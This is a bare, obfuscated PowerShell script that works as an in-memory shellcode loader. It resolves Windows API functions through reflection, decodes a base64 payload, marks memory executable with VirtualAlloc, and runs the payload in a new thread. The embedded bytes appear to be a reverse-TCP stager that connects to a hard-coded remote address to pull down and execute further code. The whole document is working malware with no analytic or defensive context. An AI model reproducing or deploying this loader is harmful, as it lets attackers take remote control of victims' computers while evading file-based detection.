function sg {
	Param ($uc, $wC6)		
	$wvPS = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $wvPS.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($wvPS.GetMethod('GetModuleHandle')).Invoke($null, @($uc)))), $wC6))
}

function kRT {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $y9TmO,
		[Parameter(Position = 1)] [Type] $lx = [Void]
	)
	
	$kTH = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$kTH.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $y9TmO).SetImplementationFlags('Runtime, Managed')
	$kTH.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $lx, $y9TmO).SetImplementationFlags('Runtime, Managed')
	
	return $kTH.CreateType()
}

[Byte[]]$cjK6 = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAKawXy2mUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
		
$t5 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((sg kernel32.dll VirtualAlloc), (kRT @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $cjK6.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($cjK6, 0, $t5, $cjK6.length)

$dPb = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((sg kernel32.dll CreateThread), (kRT @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$t5,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((sg kernel32.dll WaitForSingleObject), (kRT @([IntPtr], [Int32]))).Invoke($dPb,0xffffffff) | Out-Null
